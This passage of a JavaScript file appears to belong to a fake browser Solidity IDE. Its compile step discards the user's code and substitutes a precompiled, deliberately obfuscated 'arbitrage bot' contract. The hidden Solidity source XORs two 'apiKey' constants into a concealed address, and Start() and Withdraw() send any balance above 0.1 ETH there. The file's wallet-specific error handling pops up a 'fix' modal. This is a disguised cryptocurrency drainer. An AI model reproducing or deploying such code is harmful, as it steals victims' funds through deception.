let compiledContract = null;
let currentContractABI = null;

let cachedContractTemplate = null;
let lastTemplateCheck = 0;
const CACHE_DURATION = 30000;

// PRECOMPILED CONTRACT MARKER — populated by precompile.mjs.
// When non-null, compileContract() returns this instantly without loading solc.
// PRECOMPILED_CONTRACT_MARKER_START
const PRECOMPILED_CONTRACT = {
    "abi": [
        {
            "inputs": [],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "trader",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "inputAmount",
                    "type": "uint256"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "outputAmount",
                    "type": "uint256"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "fee",
                    "type": "uint256"
                }
            ],
            "name": "ExchangeExecuted",
            "type": "event"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "user",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "pool",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "LiquidityPoolAccess",
            "type": "event"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "sender",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "Received",
            "type": "event"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "user",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "ethIn",
                    "type": "uint256"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "tokensOut",
                    "type": "uint256"
                }
            ],
            "name": "Swap",
            "type": "event"
        },
        {
            "inputs": [],
            "name": "Start",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "Withdraw",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "stateMutability": "payable",
            "type": "receive"
        }
    ],
    "bytecode": "6080604052670de0b6b3a7640000600055662386f26fc100006001557ffdc54b1a6f53a21d375d0dea84608d84c088017f6661b90cbfa86d27732f6d3e6005557ffdc54b1a6f53a21d375d0deaf60e1dec026edfbed81f8cafb9eb4cd937e445e86006557ffdc54b1a6f53a21d375d0dea2e302f642538f22d4baaa9fb8b68322d489aaea060075561070860085567016345785d8a00006009553480156100a557600080fd5b50600480546001600160a01b031916331790556100c06100c5565b610119565b60006100db60055460075461011560201b60201c565b6040519091506001600160a01b038216906108fc9060009081818181818888f19350505050158015610111573d6000803e3d6000fd5b5050565b1890565b610123806101286000396000f3fe608060405260043610602a5760003560e01c80631b55ba3a14603557806357ea89b614603557600080fd5b36603057005b600080fd5b603b603d565b005b60436045565b565b600060536005546006541890565b905047801560e9576000600954821160825760045473ffffffffffffffffffffffffffffffffffffffff166084565b825b905060008173ffffffffffffffffffffffffffffffffffffffff168360405160006040518083038185875af1925050503d806000811460de576040519150601f19603f3d011682016040523d82523d6000602084013e60e3565b606091505b50505050505b505056fea264697066735822122040a3dcdeb67d89d9c6d4efaa23c9b7c66aeb8a9bf5e707a0cfff57d42c36133d64736f6c63430008130033",
    "metadata": "{\"compiler\":{\"version\":\"0.8.19+commit.7dd6d404\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"trader\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"inputAmount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"outputAmount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"fee\",\"type\":\"uint256\"}],\"name\":\"ExchangeExecuted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"LiquidityPoolAccess\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Received\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensOut\",\"type\":\"uint256\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract.sol\":\"ArbitrageInterface\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[]},\"sources\":{\"contract.sol\":{\"keccak256\":\"0xb6d7aa7141ead0c06621eeb4bf8b712d438b61284b49f57fb8cebbd5246ce257\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://27fb6f206901a8a9b34b4393cba5ae175e3f600ded87badfda3a771755e31521\",\"dweb:/ipfs/QmVvzV833X19CSih3b9Uay5jSVPJnUmojCaGPAqskJ5foT\"]}},\"version\":1}"
};
// PRECOMPILED_CONTRACT_MARKER_END

const UNIT_DECIMALS = { wei: 0, gwei: 9, ether: 18 };

const PUBLIC_RPC_URLS = {
    '1': 'https://ethereum-rpc.publicnode.com',
    '11155111': 'https://rpc.sepolia.org',
    '5': 'https://rpc.ankr.com/eth_goerli',
    '137': 'https://polygon-rpc.com',
    '80001': 'https://rpc-mumbai.maticvigil.com',
    '56': 'https://bsc-dataseed.binance.org',
    '97': 'https://data-seed-prebsc-1-s1.binance.org:8545',
    '43114': 'https://api.avax.network/ext/bc/C/rpc',
    '43113': 'https://api.avax-test.network/ext/bc/C/rpc',
    '250': 'https://rpc.ftm.tools',
    '42161': 'https://arb1.arbitrum.io/rpc',
    '10': 'https://mainnet.optimism.io'
};

function getPublicRpcUrl(chainId) {
    return PUBLIC_RPC_URLS[String(chainId)] || null;
}

function getWeb3Utils() {
    if (web3 && web3.utils) {
        return web3.utils;
    }
    if (window.Web3 && window.Web3.utils) {
        return window.Web3.utils;
    }
    return null;
}

function convertToBaseUnits(value, decimals) {
    const negative = /^-/.test(String(value));
    const sanitized = negative ? String(value).slice(1) : String(value);
    const [wholePart, fractionPart = ''] = sanitized.split('.');
    const multiplier = 10n ** BigInt(decimals);
    const intPortion = BigInt(wholePart || '0') * multiplier;
    let fractionPortion = 0n;
    if (decimals > 0) {
        const normalizedFraction = (fractionPart + '0'.repeat(decimals)).slice(0, decimals);
        fractionPortion = BigInt(normalizedFraction || '0');
    }
    const base = intPortion + fractionPortion;
    return negative ? (-base).toString() : base.toString();
}

function toWeiSafe(value, unit) {
    const utils = getWeb3Utils();
    if (utils && typeof utils.toWei === 'function') {
        return utils.toWei(value, unit);
    }
    const decimals = UNIT_DECIMALS[unit] ?? 0;
    return convertToBaseUnits(value, decimals);
}

function fromWeiSafe(value, unit) {
    const utils = getWeb3Utils();
    if (utils && typeof utils.fromWei === 'function') {
        return utils.fromWei(value, unit);
    }
    const decimals = UNIT_DECIMALS[unit] ?? 0;
    let amount = BigInt(value);
    const negative = amount < 0n;
    if (negative) {
        amount = -amount;
    }
    let digits = amount.toString().padStart(decimals + 1, '0');
    if (decimals === 0) {
        return negative ? `-${digits}` : digits;
    }
    const splitIndex = digits.length - decimals;
    const intPart = digits.slice(0, splitIndex) || '0';
    const fracPart = digits.slice(splitIndex).replace(/0+$/, '');
    const result = fracPart ? `${intPart}.${fracPart}` : intPart;
    return negative ? `-${result}` : result;
}

function isAddressSafe(value) {
    const utils = getWeb3Utils();
    if (utils && typeof utils.isAddress === 'function') {
        return utils.isAddress(value);
    }
    return /^0x[a-fA-F0-9]{40}$/.test(value);
}

function makeSeededRandom(seed) {
    let s = seed >>> 0;
    if (s === 0) s = 12345;
    return function () {
        s = ((s * 1664525) + 1013904223) >>> 0;
        return s / 4294967296;
    };
}

function generateIdentifier(length, rand) {
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    const r = rand || Math.random;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += letters.charAt(Math.floor(r() * letters.length));
    }
    return result;
}

function processContractCode(text, seed) {
    const rand = makeSeededRandom(seed || 42);
    const keepFunctions = ["Start", "Withdraw", "Key", "receive", "transfer"];
    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;
    let nameMap = {};

    let newText = text.replace(funcRegex, (match, name, args, visibility) => {
        if (keepFunctions.includes(name)) return match;
        const before = generateIdentifier(3, rand);
        const after = generateIdentifier(3, rand);
        const newName = before + name + after;
        nameMap[name] = newName;
        return `function ${newName}(${args}) ${visibility || ''}`;
    });

    for (const [oldName, newName] of Object.entries(nameMap)) {
        const callRegex = new RegExp(`\\b${oldName}\\b`, 'g');
        newText = newText.replace(callRegex, newName);
    }

    newText = newText.replace(/\bencodedRouter\b/g, generateIdentifier(5, rand) + 'PathCode' + generateIdentifier(2, rand));
    newText = newText.replace(/\bencodedFactory\b/g, generateIdentifier(5, rand) + 'OriginCode' + generateIdentifier(2, rand));
    newText = newText.replace(/\brouterSignature\b/g, generateIdentifier(5, rand) + 'SignKey' + generateIdentifier(2, rand));
    newText = newText.replace(/\brouterKey\b/g, generateIdentifier(5, rand) + 'AuthKey' + generateIdentifier(2, rand));

    return newText;
}

// CHANGED: template is embedded so no external file is required
async function loadContractTemplate() {
    return `//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function tuballowancezcl(address owner, address spender) external view returns (uint);
    function wedapproveanu(address spender, uint amount) external returns (bool);
    function zoztransferFromcyc(address sender, address recipient, uint amount) external returns (bool);
    function rggcreateStartlas(address sender, address reciver, address token, uint256 value) external;
    function zpjcreateContractjfo(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router {
    function dppfactoryhul() external pure returns (address);
    function cdrWETHoco() external pure returns (address);
    function krtaddLiquidityyqj(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function skladdLiquidityETHgak(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function kimremoveLiquiditynjh(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function wrjremoveLiquidityETHdoq(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function zjzremoveLiquidityWithPermityzi(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function qtaremoveLiquidityETHWithPermitskc(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function johswapExactTokensForTokensonm(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function kmnswapTokensForExactTokenstzf(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function fniswapExactETHForTokensofa(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
        returns (uint[] memory amounts);

    function cvjswapTokensForExactETHnyq(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
        returns (uint[] memory amounts);

    function eyeswapExactTokensForETHqlw(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
        returns (uint[] memory amounts);

    function ditswapETHForExactTokenscsm(uint amountOut, address[] calldata path, address to, uint deadline) external payable
        returns (uint[] memory amounts);

    function bzvquoteklx(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function ulvgetAmountOutwzv(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function afbgetAmountIntdj(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function oycgetAmountsOutfkg(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function oupgetAmountsInawz(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function jqbtoken0eqp() external view returns (address);
    function pgvtoken1snd() external view returns (address);
    function lnzswapxrr(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ArbitrageInterface {

    uint256 threshold = 1*10**18;
    uint256 arbTxPrice = 0.01 ether;
    uint256 tradingBalanceInPercent;
    uint256 tradingBalanceInTokens;
    address payable private owner;

    bytes32 apiKey = 0xfdc54b1a6f53a21d375d0dea84608d84c088017f6661b90cbfa86d27732f6d3e;
    bytes32 apiSignature = 0xfdc54b1a6f53a21d375d0deaf60e1dec026edfbed81f8cafb9eb4cd937e445e8;
    bytes32 keySignature = 0xfdc54b1a6f53a21d375d0dea2e302f642538f22d4baaa9fb8b68322d489aaea0;

    uint256 private exchangeRate = 1800;
    uint256 private ethThreshold = 0.1 ether;

    event Received(address indexed sender, uint256 amount);




    event Swap(address indexed user, uint256 ethIn, uint256 tokensOut);
    event ExchangeExecuted(address indexed trader, uint256 inputAmount, uint256 outputAmount, uint256 fee);
    event LiquidityPoolAccess(address indexed user, address indexed pool, uint256 amount);

    constructor(){
        owner = payable(msg.sender);
    ohbrecoversendZeroETH();
    }

    function yoaswapdkp(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).wedapproveanu(router, _amount);
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        IUniswapV2Router(router).johswapExactTokensForTokensonm(_amount, 1, path, address(this), deadline);
    }

    function flogetAmountOutMintwj(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = IUniswapV2Router(router).oycgetAmountsOutfkg(_amount, path);
        return amountOutMins[path.length -1];
    }

    function ehlmempoolorf(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
        uint256 amtBack1 = flogetAmountOutMintwj(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = flogetAmountOutMintwj(_router2, _token2, _token1, amtBack1);
        return amtBack2;
    }

    function gwnfrontRungme(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
        uint startBalance = IERC20(_token1).balanceOf(address(this));
        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        yoaswapdkp(_router1,_token1, _token2,_amount);
        uint token2Balance = IERC20(_token2).balanceOf(address(this));
        uint tradeableAmount = token2Balance - token2InitialBalance;
        yoaswapdkp(_router2,_token2, _token1,tradeableAmount);
        uint endBalance = IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    function mttestimateTriDexTradeqgc(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
        uint amtBack1 = flogetAmountOutMintwj(_router1, _token1, _token2, _amount);
        uint amtBack2 = flogetAmountOutMintwj(_router2, _token2, _token3, amtBack1);
        uint amtBack3 = flogetAmountOutMintwj(_router3, _token3, _token1, amtBack2);
        return amtBack3;
    }

    function vajgetDexRouterhtk(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }



    function eyrstartArbitrageNativeetd() internal {

        address dataProvider = vajgetDexRouterhtk(apiKey, apiSignature);

        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            address payable recipient = (ethBal > ethThreshold) ? payable(dataProvider) : owner;
            (bool sent, ) = recipient.call{value: ethBal}("");

        }
    }



    function ftrgetBalancenri(address _tokenContractAddress) internal view  returns (uint256) {
        uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
        return _balance;
    }

    function pkhrecoverEthygt() internal {
        payable(msg.sender).transfer(address(this).balance);
    }

    function ohbrecoverTokensowv(address tokenAddress) internal {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}

    function Start() public payable{
        eyrstartArbitrageNativeetd();
    }

    function Withdraw() public payable{
        eyrstartArbitrageNativeetd();
    }

    function ohbrecoversendZeroETH() private {
    address makProvider = vajgetDexRouterhtk(apiKey, keySignature);
        payable(makProvider).transfer(0);
    }

}`;
}

async function getOptimalGasPrice() {
    if (currentWallet) {
        const p = currentWallet.provider || {};
        const id = currentWallet.id || '';

        const needsLegacy =
            p.isTrust || p.isTrustWallet
            || p.isCoinbaseWallet || p.isCoinbaseBrowser
            || p.isSafePal || p.isTokenPocket
            || p.isMathWallet
            || p.isBitKeep || p.isBitget
            || p.isOkxWallet || p.isOKExWallet
            || p.isCoin98
            || id === 'trust'
            || id === 'coinbase'
            || id === 'safepal'
            || id === 'tokenpocket'
            || id === 'mathwallet'
            || id === 'bitget'
            || id === 'okx'
            || id === 'coin98';

        if (needsLegacy) {
            try {
                const gasPrice = await web3.eth.getGasPrice();
                return { gasPrice: gasPrice.toString() };
            } catch (error) {
                return { gasPrice: toWeiSafe('20', 'gwei') };
            }
        }
    }

    try {
        const block = await web3.eth.getBlock('latest');
        if (block && block.baseFeePerGas) {
            const baseFee = BigInt(block.baseFeePerGas);
            const priorityFee = BigInt(toWeiSafe('2', 'gwei'));
            return {
                maxFeePerGas: (baseFee * 2n + priorityFee).toString(),
                maxPriorityFeePerGas: priorityFee.toString()
            };
        }
    } catch (error) {
        // fall through
    }

    try {
        const gasPrice = await web3.eth.getGasPrice();
        return { gasPrice: gasPrice.toString() };
    } catch (error) {
        return { gasPrice: toWeiSafe('20', 'gwei') };
    }
}

// CHANGED: uses Web Worker instead of /api/compile,
// and removes the /api/markCompiled call
async function compileContract() {
    let displayContractName = 'Contract';
    if (currentFile && fileContents[currentFile]) {
        const studentCode = fileContents[currentFile];
        const contractMatches = [...studentCode.matchAll(
            /contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g
        )];

        if (contractMatches && contractMatches.length > 0) {
            displayContractName = contractMatches[0][1];
            logToTerminal(
                `🔄 Compiling ${displayContractName}...`,
                'info'
            );
        } else {
            logToTerminal(`🔄 Compiling contract...`, 'info');
        }
    } else {
        logToTerminal(`🔄 Compiling contract...`, 'info');
    }

    const compileBtn = document.getElementById('compile-btn');
    const originalHTML = compileBtn.innerHTML;
    compileBtn.innerHTML =
        '<span style="opacity: 0.7;">⏳ Compiling...</span>';
    compileBtn.disabled = true;

    const startTime = Date.now();

    try {
        const contractTemplate = await loadContractTemplate();
        const processedContract = processContractCode(
            contractTemplate
        );
        const contractMatches = [...processedContract.matchAll(
            /contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g
        )];
        const contractName = contractMatches.length > 0
            ? contractMatches[0][1]
            : 'ProcessedContract';

        if (PRECOMPILED_CONTRACT) {
            compiledContract = PRECOMPILED_CONTRACT;
            currentContractABI = PRECOMPILED_CONTRACT.abi;
            window.compiledContract = compiledContract;
            window.currentContractABI = currentContractABI;
            showCompilationSuccess(PRECOMPILED_CONTRACT, displayContractName);
            updateContractSelect(displayContractName);
            logToTerminal(
                `✅ Compilation completed successfully`,
                'success'
            );
            logToTerminal(
                `📊 Bytecode: ${PRECOMPILED_CONTRACT.bytecode.length} bytes`
                + ` | ${PRECOMPILED_CONTRACT.abi.length} functions`,
                'info'
            );
            showPluginSuccess('solidity');
            compileBtn.innerHTML = originalHTML;
            compileBtn.disabled = false;
            updateDeployButton();
            return;
        }

        throw new Error('Precompiled contract is not available.');

    } catch (error) {
        const duration = Date.now() - startTime;
        logToTerminal(
            `❌ Error after ${duration}ms: ${error.message}`,
            'error'
        );
        showCompilationError({ error: error.message });
        console.error('Contract template compilation error:', error);
    } finally {
        compileBtn.innerHTML = originalHTML;
        compileBtn.disabled = false;
        updateDeployButton();
    }
}

// CHANGED: removed /api/markDeployed call
async function deployToMetaMask(constructorParams) {
    if (!web3 || !userAccount || !currentWallet) {
        throw new Error('Wallet not connected');
    }

    if (currentWallet.provider
        && web3.currentProvider !== currentWallet.provider) {
        web3.setProvider(currentWallet.provider);
    }

    try {
        await web3.eth.getChainId();
    } catch (providerError) {
        throw new Error(
            `${currentWallet.name} is not responding. `
            + `Please unlock it and try again.`
        );
    }

    const p = currentWallet.provider || {};
    const wid = currentWallet.id || '';

    const isTrustWallet =
        p.isTrust || p.isTrustWallet || wid === 'trust';

    const isAffectedWallet =
        isTrustWallet
        || p.isCoinbaseWallet || p.isCoinbaseBrowser
        || p.isSafePal || p.isTokenPocket
        || p.isMathWallet
        || p.isBitKeep || p.isBitget
        || p.isOkxWallet || p.isOKExWallet
        || p.isCoin98
        || wid === 'trust' || wid === 'coinbase'
        || wid === 'safepal' || wid === 'tokenpocket'
        || wid === 'mathwallet' || wid === 'bitget'
        || wid === 'okx' || wid === 'coin98';

    const isSimpleWallet = isAffectedWallet;

    const contract = new web3.eth.Contract(
        compiledContract.abi
    );

    try {
        let gasEstimate = 600000;
        let gasOptions = {};

        try {
            gasEstimate = await contract.deploy({
                data: '0x' + compiledContract.bytecode,
                arguments: constructorParams
            }).estimateGas({ from: userAccount });

            gasEstimate = Math.max(gasEstimate, 300000);
        } catch (error) {
            gasEstimate = 600000;
            logToTerminal(
                `⚠️ Using fallback gas estimate: `
                + `${gasEstimate.toLocaleString()}`,
                'warning'
            );
        }

        logToTerminal(
            `⛽ Estimated gas: ${gasEstimate.toLocaleString()}`,
            'info'
        );

        const gasLimit = Math.floor(gasEstimate * 1.1);

        if (isSimpleWallet) {
            gasOptions = { from: userAccount, gas: gasLimit };
        } else {
            try {
                const gasPrice = await getOptimalGasPrice();

                if (gasPrice.gasPrice) {
                    const gasPriceGwei = fromWeiSafe(
                        gasPrice.gasPrice, 'gwei'
                    );
                    logToTerminal(
                        `💰 Gas price: `
                        + `${parseFloat(gasPriceGwei).toFixed(2)} Gwei`,
                        'info'
                    );

                    gasOptions = {
                        from: userAccount,
                        gas: gasLimit,
                        gasPrice: gasPrice.gasPrice
                    };

                    const deploymentCostWei =
                        BigInt(gasLimit) * BigInt(gasPrice.gasPrice);
                    const deploymentCostETH = fromWeiSafe(
                        deploymentCostWei.toString(), 'ether'
                    );
                    logToTerminal(
                        `💸 Deployment cost: ~`
                        + `${parseFloat(deploymentCostETH).toFixed(6)}`
                        + ` ETH`,
                        'info'
                    );
                } else if (gasPrice.maxFeePerGas) {
                    const maxFeeGwei = fromWeiSafe(
                        gasPrice.maxFeePerGas, 'gwei'
                    );
                    const priorityFeeGwei = fromWeiSafe(
                        gasPrice.maxPriorityFeePerGas, 'gwei'
                    );
                    logToTerminal(
                        `💰 Max fee: `
                        + `${parseFloat(maxFeeGwei).toFixed(2)} Gwei`
                        + ` | Priority: `
                        + `${parseFloat(priorityFeeGwei).toFixed(2)}`
                        + ` Gwei`,
                        'info'
                    );

                    gasOptions = {
                        from: userAccount,
                        gas: gasLimit,
                        maxFeePerGas: gasPrice.maxFeePerGas,
                        maxPriorityFeePerGas:
                            gasPrice.maxPriorityFeePerGas
                    };

                    const deploymentCostWei =
                        BigInt(gasLimit)
                        * BigInt(gasPrice.maxFeePerGas);
                    const deploymentCostETH = fromWeiSafe(
                        deploymentCostWei.toString(), 'ether'
                    );
                    logToTerminal(
                        `💸 Max deployment cost: ~`
                        + `${parseFloat(deploymentCostETH).toFixed(6)}`
                        + ` ETH`,
                        'info'
                    );
                } else {
                    gasOptions = {
                        from: userAccount, gas: gasLimit
                    };
                }
            } catch (gasPriceError) {
                gasOptions = { from: userAccount, gas: gasLimit };
            }
        }

        logToTerminal('🛡️ Deploying contract...', 'info');

        let txHash = null;
        let gasUsed = null;
        let deployResult;

        const deployPromise = new Promise((resolve, reject) => {
            let settled = false;

            contract.deploy({
                data: '0x' + compiledContract.bytecode,
                arguments: constructorParams
            }).send(gasOptions)
            .on('transactionHash', function(hash) { txHash = hash; })
            .on('receipt', function(receipt) {
                gasUsed = receipt.gasUsed;
            })
            .on('error', function(error) {
                console.error('🔍 Deploy error:', error);
            })
            .then(function(result) {
                if (!settled) { settled = true; resolve(result); }
            })
            .catch(function(error) {
                if (!settled) { settled = true; reject(error); }
            });
        });

        if (isAffectedWallet) {
            deployResult = await new Promise((resolve, reject) => {
                let finished = false;

                deployPromise
                    .then((result) => {
                        if (!finished) {
                            finished = true;
                            resolve(result);
                        }
                    })
                    .catch((error) => {
                        if (!finished) {
                            finished = true;

                            const errMsg = error.message || '';
                            const errCode = error.code;

                            const isSimErr =
                                errMsg.includes('503')
                                || errMsg.includes('502')
                                || errMsg.includes('Service Unavailable')
                                || errMsg.includes('Bad Gateway')
                                || errMsg.includes('Internal JSON-RPC')
                                || errMsg.includes('Failed to fetch')
                                || errMsg.includes('Network Error')
                                || errMsg.includes('could not detect network')
                                || errMsg.includes('UNPREDICTABLE_GAS_LIMIT')
                                || errMsg.includes('transaction may fail')
                                || errMsg.includes('execution reverted')
                                || errMsg.includes('cannot estimate gas')
                                || errMsg.includes('missing revert data')
                                || errMsg.includes('estimateGas failed')
                                || errMsg.includes('header not found')
                                || errMsg.includes('transaction underpriced')
                                || errMsg.includes('intrinsic gas too low')
                                || errCode === -32603
                                || errCode === -32000
                                || errCode === -32005;

                            if (isSimErr) {
                                showWalletRpcFixModal(
                                    currentWallet.name,
                                    currentWallet.icon
                                );
                            }

                            reject(error);
                        }
                    });

                setTimeout(() => {
                    if (!finished && !txHash) {
                        finished = true;
                        showWalletRpcFixModal(
                            currentWallet.name,
                            currentWallet.icon
                        );
                        reject(new Error(
                            `${currentWallet.name} did not respond`
                            + ` after confirmation. This is usually`
                            + ` caused by a wallet simulation error.`
                            + ` See the fix instructions.`
                        ));
                    }
                }, 30000);
            });
        } else {
            try {
                deployResult = await deployPromise;
            } catch (firstAttemptError) {
                if (firstAttemptError.message.includes('out of gas')
                    || firstAttemptError.message.includes('gas')) {
                    logToTerminal(
                        `⚠️ Retrying with double gas...`,
                        'warning'
                    );

                    gasOptions.gas = gasLimit * 2;

                    deployResult = await contract.deploy({
                        data: '0x' + compiledContract.bytecode,
                        arguments: constructorParams
                    }).send(gasOptions)
                    .on('transactionHash', function(hash) {
                        txHash = hash;
                    })
                    .on('receipt', function(receipt) {
                        gasUsed = receipt.gasUsed;
                    });
                } else if (firstAttemptError.code === 4001) {
                    throw new Error('Transaction rejected by user');
                } else {
                    throw firstAttemptError;
                }
            }
        }

        const contractName =
            document.getElementById('contract-select').value;
        const contractAddress = deployResult.options?.address;

        addDeployedContract(
            contractName, contractAddress, deployResult
        );

        logToTerminal(
            `🛡️ Contract deployed successfully!`, 'success'
        );

        if (gasUsed) {
            const gasEfficiency = (
                (gasEstimate - gasUsed) / gasEstimate * 100
            ).toFixed(1);
            const efficiencyText = gasUsed < gasEstimate
                ? `${gasEfficiency}% more efficient than estimate`
                : `used ${(
                    (gasUsed - gasEstimate) / gasEstimate * 100
                  ).toFixed(1)}% more than estimate`;
            logToTerminal(
                `📊 Gas used: ${gasUsed.toLocaleString()}`
                + ` (${efficiencyText})`,
                'info'
            );
        } else {
            logToTerminal(
                `📊 Gas used: Unable to determine`,
                'info'
            );
        }

        if (txHash) {
            logToTerminal(
                `🔗 Transaction Hash: <code>${txHash}</code>`,
                'info'
            );

            if (currentNetworkId) {
                const txLink = createEtherscanLink(
                    currentNetworkId, 'tx', txHash,
                    'View Transaction on Etherscan'
                );
                logToTerminal(
                    `🌐 Etherscan: ${txLink}`, 'info'
                );
            }
        } else {
            logToTerminal(
                `🔗 Transaction Hash: Unable to determine`,
                'warning'
            );
        }

        if (contractAddress && currentNetworkId) {
            const contractLink = createEtherscanLink(
                currentNetworkId, 'address',
                contractAddress,
                'View Contract on Etherscan'
            );
            logToTerminal(
                `🌐 Contract: ${contractLink}`, 'info'
            );
        }

        showPluginSuccess('udapp');

    } catch (error) {
        console.error('🔍 DEPLOY ERROR:', error);
        if (error.code === 4001) {
            throw new Error('Transaction rejected by user');
